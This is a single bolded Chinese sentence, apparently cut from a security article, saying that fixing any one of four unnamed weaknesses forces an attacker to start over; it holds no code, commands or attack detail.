**四个里只要修一个，攻击者就得从头再来。**
